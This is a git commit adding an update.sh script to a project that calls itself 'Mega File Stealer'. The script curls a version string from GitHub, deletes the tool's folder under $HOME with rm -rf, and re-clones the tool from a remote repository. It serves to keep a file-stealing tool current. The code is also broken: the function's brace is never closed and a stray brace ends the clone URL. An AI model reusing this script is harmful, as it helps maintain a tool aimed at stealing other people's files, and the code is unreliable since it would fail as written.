38fb491df41659519141c7b80d1d9692b4234878
Malik Atiquz zaman <71874818+Malik332@users.noreply.github.com>
2021-03-22 20:26:24 +0530

    Create update.sh

---
+++ update.sh
@@ -0,0 +1,39 @@
+#!/bin/bash
+zCh=$(curl https://raw.githubusercontent.com/ZechBron/Mega-File-Stealer/zMFS/update)
+
+update() {
+cd $HOME
+rm -rf MEGA-FILE-STEALER
+git clone https://github.com/Malik332/MEGA-FILE-STEALER}
+
+if [ "$zCh" == "Version 2.3" ]; then
+echo -e "\e[91mNo latest version available\e[0m"
+
+elif [ "$zCh" == "Version 2.4" ]; then
+update
+echo -e "\e[92mMega File Stealer updated to Version 2.4\e[0m"
+
+elif [ "$zCh" == "Version 2.5" ]; then
+update
+echo -e "\e[92mMega File Stealer updated to Version 2.5\e[0m"
+
+elif [ "$zCh" == "Version 2.6" ]; then
+update
+echo -e "\e[92mMega File Stealer updated to Version 2.6\e[0m"
+
+elif [ "$zCh" == "Version 2.7" ]; then
+update
+echo -e "\e[92mMega File Stealer updated to Version 2.7\e[0m"
+
+elif [ "$zCh" == "Version 2.8" ]; then
+update
+echo -e "\e[92mMega File Stealer updated to Version 2.8\e[0m"
+
+elif [ "$zCh" == "Version 2.9" ]; then
+update
+echo -e "\e[92mMega File Stealer updated to Version 2.9\e[0m"
+
+elif [ "$zCh" == "Version 3.0" ]; then
+update
+echo -e "\e[92mMega File Stealer updated to Version 3.0\e[0m"
+fi
